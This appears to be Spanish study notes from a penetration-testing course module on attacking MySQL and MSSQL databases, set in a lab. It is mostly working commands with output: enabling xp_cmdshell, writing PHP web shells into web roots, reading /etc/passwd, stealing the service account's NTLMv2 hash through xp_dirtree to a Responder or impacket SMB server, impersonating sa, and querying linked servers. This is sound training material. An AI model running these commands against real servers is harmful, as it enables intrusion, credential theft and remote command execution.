---
tags:
---


# POR ORGANIZAR

## Mecanismos de Autenticación

`MSSQL` admite dos [modos de autenticación](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), lo que significa que los usuarios se pueden crear en Windows o SQL Server:

| **Tipo de Autenticación**     | **Descripción**                                                                                                                                                                                                                                                                                                                                                                                 |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | Este es el valor predeterminado, a menudo denominado `integrated` seguridad porque el modelo de seguridad de SQL Server está estrechamente integrado con Windows/Active Directory. Se confía en las cuentas específicas de usuario y grupo de Windows para iniciar sesión en SQL Server. Los usuarios de Windows que ya han sido autenticados no tienen que presentar credenciales adicionales. |
| `Mixed mode`                  | El modo mixto admite la autenticación mediante cuentas de Windows/Active Directory y SQL Server. Los pares de nombre de usuario y contraseña se mantienen dentro de SQL Server.                                                                                                                                                                                                                 |


`MySQL` también admite diferentes [métodos de autenticación](https://dev.mysql.com/doc/internals/en/authentication-method.html), como nombre de usuario y contraseña, así como autenticación de Windows (se requiere un complemento). Además, los administradores pueden [elija un modo de autenticación](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) por muchas razones, incluyendo compatibilidad, seguridad, usabilidad y más. Sin embargo, dependiendo del método que se implemente, pueden producirse configuraciones erróneas.


`MySQL`esquemas/bases de datos predeterminados del sistema:

- `mysql`es la base de datos del sistema que contiene tablas que almacenan la información requerida por el servidor MySQL
- `information_schema`- proporciona acceso a los metadatos de la base de datos
- `performance_schema`es una característica para monitorear la ejecución de MySQL Server en un nivel bajo
- `sys`un conjunto de objetos que ayuda a los DBA y desarrolladores a interpretar los datos recopilados por el Esquema de rendimiento

`MSSQL`esquemas/bases de datos predeterminados del sistema:

- `master`- mantiene la información para una instancia de SQL Server.
- `msdb`- utilizado por SQL Server Agent.
- `model`- una base de datos de plantillas copiada para cada nueva base de datos.
- `resource`una base de datos de solo lectura que mantiene los objetos del sistema visibles en cada base de datos del servidor en el esquema sys.
- `tempdb`- mantiene objetos temporales para consultas SQL.


#### Mostrar Bases de Datos

  Atacar bases de datos SQL

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Si usamos `sqlcmd`, tendremos que usar `GO` después de nuestra consulta para ejecutar la sintaxis SQL.

  Atacar bases de datos SQL

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### Seleccione una base de datos

  Atacar bases de datos SQL

```shell-session
mysql> USE htbusers;

Database changed
```

  Atacar bases de datos SQL

```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```


#### Mostrar Tablas

  Atacar bases de datos SQL

```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

  Atacar bases de datos SQL

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```


#### Seleccione todos los datos de la Tabla "usuarios"

  Atacar bases de datos SQL

```shell-session
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

  Atacar bases de datos SQL

```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```


## Ejecutar Comandos

`Command execution`es una de las capacidades más deseadas a la hora de atacar servicios comunes porque nos permite controlar el sistema operativo. Si tenemos los privilegios apropiados, podemos usar la base de datos SQL para ejecutar comandos del sistema o crear los elementos necesarios para hacerlo.

`MSSQL` tiene un [procedimientos almacenados extendidos](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) llamado [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) lo que nos permite ejecutar comandos del sistema utilizando SQL. Tenga en cuenta lo siguiente sobre `xp_cmdshell`:

- `xp_cmdshell` es una característica potente y está deshabilitada de forma predeterminada. `xp_cmdshell` se puede habilitar y deshabilitar utilizando el [Gestión Basada en Políticas](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) o ejecutando [sp_configurar](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- El proceso de Windows generado por `xp_cmdshell` tiene los mismos derechos de seguridad que la cuenta de servicio de SQL Server
- `xp_cmdshell`funciona sincrónicamente. El control no se devuelve a la persona que llama hasta que se completa el comando command-shell

Para ejecutar comandos utilizando la sintaxis SQL en MSSQL, use:

#### XP_CMDSHELL

  Atacar bases de datos SQL

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Si `xp_cmdshell` no está habilitado, podemos habilitarlo, si tenemos los privilegios apropiados, usando el siguiente comando:

Código: mssql

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## Escribir Archivos Locales

`MySQL` no tiene un procedimiento almacenado como `xp_cmdshell`, pero podemos lograr la ejecución de comandos si escribimos en una ubicación en el sistema de archivos que puede ejecutar nuestros comandos. Por ejemplo, supongamos `MySQL` opera en un servidor web basado en PHP u otros lenguajes de programación como ASP.NET. Si tenemos los privilegios apropiados, podemos intentar escribir un archivo usando [SELECCIONAR EN EL ARCHIVO DE SALIDA](https://mariadb.com/kb/en/select-into-outfile/) en el directorio del servidor web. Luego podemos navegar a la ubicación donde se encuentra el archivo y ejecutar nuestros comandos.

#### MySQL - Escribir Archivo Local

  Atacar bases de datos SQL

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

En `MySQL`, una variable del sistema global [seguro_archivo_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limita el efecto de las operaciones de importación y exportación de datos, como las realizadas por el `LOAD DATA` y `SELECT … INTO OUTFILE` declaraciones y el [LOAD_ARCHIVO()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) función. Estas operaciones están permitidas solo a los usuarios que tienen el [ARCHIVO](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilegio.

`secure_file_priv`puede establecerse de la siguiente manera:

- Si está vacía, la variable no tiene efecto, lo que no es una configuración segura.
- Si se establece en el nombre de un directorio, el servidor limita las operaciones de importación y exportación para que funcionen únicamente con los archivos de ese directorio. El directorio debe existir; el servidor no lo crea.
- Si se establece en NULL, el servidor deshabilita las operaciones de importación y exportación.

En el siguiente ejemplo, podemos ver el `secure_file_priv` la variable está vacía, lo que significa que podemos leer y escribir datos usando `MySQL`:


#### MySQL - Privilegios de Archivos Seguros

  Atacar bases de datos SQL

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Para escribir archivos usando `MSSQL`, necesitamos habilitar [Procedimientos de Automatización de Ole](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), que requiere privilegios de administrador, y luego ejecutar algunos procedimientos almacenados para crear el archivo:


#### MSSQL - Habilitar procedimientos de automatización de Ole

  Atacar bases de datos SQL

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Crear un archivo

  Atacar bases de datos SQL

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```


## Leer Archivos Locales

Por defecto, `MSSQL` permite la lectura de archivos en cualquier archivo del sistema operativo al que la cuenta tenga acceso de lectura. Podemos utilizar la siguiente consulta SQL:

#### Lea Archivos Locales en MSSQL

  Atacar bases de datos SQL

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

Como mencionamos anteriormente, por defecto a `MySQL` la instalación no permite la lectura arbitraria de archivos, pero si la configuración correcta está en su lugar y con los privilegios apropiados, podemos leer archivos utilizando los siguientes métodos:


#### MySQL - Leer Archivos Locales en MySQL

  Atacar bases de datos SQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```


## Captura MSSQL Service Hash

En el `Attacking SMB` sección, discutimos que podríamos crear un servidor SMB falso para robar un hash y abusar de alguna implementación predeterminada dentro de un sistema operativo Windows. También podemos robar el hash de la cuenta de servicio MSSQL usando `xp_subdirs` o `xp_dirtree` procedimientos almacenados indocumentados, que utilizan el protocolo SMB para recuperar una lista de directorios secundarios en un directorio principal especificado del sistema de archivos. Cuando usamos uno de estos procedimientos almacenados y lo señalamos a nuestro servidor SMB, la funcionalidad de escucha de directorios obligará al servidor a autenticar y enviar el hash NTLMv2 de la cuenta de servicio que ejecuta SQL Server.

Para que esto funcione, primero tenemos que empezar [Respondedor](https://github.com/lgandx/Responder) o [pulpaket-smbserver](https://github.com/SecureAuthCorp/impacket) y ejecute una de las siguientes consultas SQL:

#### XP_DIRTREE Hash Robando

  Atacar bases de datos SQL

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### XP_SUBDIRS Hash Robo

  Atacar bases de datos SQL

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```



#### XP_SUBDIRS Hash Robando con Respondedor

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

#### XP_SUBDIRS Hash Robando con impacket

  Atacar bases de datos SQL

```shell-session
vcrdcr@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```



## Hacerse pasar por Usuarios Existentes con MSSQL

SQL Server tiene un permiso especial, llamado `IMPERSONATE`ésto permite al usuario en ejecución asumir los permisos de otro usuario o iniciar sesión hasta que se restablezca el contexto o finalice la sesión. Exploremos cómo el `IMPERSONATE` el privilegio puede conducir a una escalada de privilegios en SQL Server.

Primero, necesitamos identificar a los usuarios a los que podemos suplantar. Los sysadmins pueden hacerse pasar por cualquier persona de forma predeterminada, pero para los usuarios no administradores, los privilegios deben asignarse explícitamente. Podemos utilizar la siguiente consulta para identificar a los usuarios que podemos suplantar:

#### Identificar Usuarios que Podemos Hacerse pasar

  Atacar bases de datos SQL

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Para tener una idea de las posibilidades de escalado de privilegios, verifiquemos si nuestro usuario actual tiene el rol sysadmin:

#### Verificar nuestro Usuario Actual y Papel

  Atacar bases de datos SQL

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Como el valor devuelto `0` indica, no tenemos el rol sysadmin, pero podemos hacerse pasar por el `sa` usuario. Hagamos de suplantar al usuario y ejecutemos los mismos comandos. Para hacerse pasar por un usuario, podemos usar la instrucción Transact-SQL `EXECUTE AS LOGIN` y configúrelo al usuario que queremos suplantar.

#### Hacerse pasar por el usuario de SA

  Atacar bases de datos SQL

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

**Nota:** Se recomienda correr `EXECUTE AS LOGIN` dentro del DB maestro, porque todos los usuarios, por defecto, tienen acceso a esa base de datos. Si un usuario al que intenta hacerse pasar no tiene acceso al DB al que se está conectando presentará un error. Intenta pasar al DB maestro usando `USE master`.

Ahora podemos ejecutar cualquier comando como sysadmin como el valor devuelto `1` indica. Para revertir la operación y volver a nuestro usuario anterior, podemos usar la instrucción Transact-SQL `REVERT`.

**Nota:** Si encontramos un usuario que no es sysadmin, aún podemos comprobar si el usuario tiene acceso a otras bases de datos o servidores vinculados.


## Comunicarse con Otras Bases de Datos con MSSQL

`MSSQL` tiene una opción de configuración llamada [servidores vinculados](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Los servidores vinculados normalmente están configurados para permitir que el motor de base de datos ejecute una instrucción Transact-SQL que incluye tablas en otra instancia de SQL Server u otro producto de base de datos como Oracle.

Si logramos obtener acceso a un servidor SQL Server con un servidor vinculado configurado, podemos movernos lateralmente a ese servidor de base de datos. Los administradores pueden configurar un servidor vinculado utilizando credenciales del servidor remoto. Si esas credenciales tienen privilegios de sysadmin, es posible que podamos ejecutar comandos en la instancia remota de SQL. Veamos cómo podemos identificar y ejecutar consultas en servidores vinculados.

#### Identificar servidores vinculados en MSSQL

  Atacar bases de datos SQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

Como podemos ver en la salida de la consulta, tenemos el nombre del servidor y la columna `isremote`, donde `1` means es un servidor remoto, y `0` es un servidor vinculado. Podemos ver [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) para más información.

A continuación, podemos intentar identificar al usuario utilizado para la conexión y sus privilegios. El [EJECUTAR](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) la instrucción se puede usar para enviar comandos de paso a servidores vinculados. Agregamos nuestro comando entre paréntesis y especificamos el servidor vinculado entre corchetes (`[ ]`).

  Atacar bases de datos SQL

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

**Nota:** Si necesitamos usar comillas en nuestra consulta al servidor vinculado, necesitamos usar comillas dobles simples para escapar de la cotización única. Para ejecutar múltiples comandos a la vez podemos dividirlos con un semi colon (;).


